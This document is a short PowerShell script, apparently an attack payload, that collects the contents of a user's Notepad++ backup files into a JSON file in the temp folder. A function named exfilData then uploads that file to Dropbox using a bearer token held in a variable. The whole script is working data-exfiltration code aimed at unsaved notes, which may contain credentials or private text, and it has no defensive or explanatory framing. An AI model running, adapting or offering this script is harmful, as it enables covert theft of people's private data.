$FileName = "$ENV:tmp/$ENV:USERNAME-NPPlusData-$(Get-Date -f hh-mm_dd-MM-yyyy).txt"
$appdataroaming = $ENV:APPDATA
$toread = "Notepad++\backup"
$fullpath = Join-Path -Path $appdataroaming -ChildPath $toread
$filelist = Get-ChildItem $fullpath\*@*
$backupcontents = ForEach ($filepath in $filelist)
    {
        $filecontent = Get-Content -Path $filepath
        [pscustomobject]@{
            'FileContent:' = $filecontent
        }
    }
$out = ConvertTo-Json $backupcontents
$out > $FileName 
function exfilData {
    [CmdletBinding()]
    param (
    [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
    [Alias("f")]
    [string]$SourceFilePath
    )
    $outputFile = Split-Path $SourceFilePath -leaf
    $TargetFilePath="/$outputFile"
    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
    $authorization = "Bearer " + $db
    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $headers.Add("Authorization", $authorization)
    $headers.Add("Dropbox-API-Arg", $arg)
    $headers.Add("Content-Type", 'application/octet-stream')
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
    }
if (-not ([string]::IsNullOrEmpty($db))){exfilData -f $FileName}
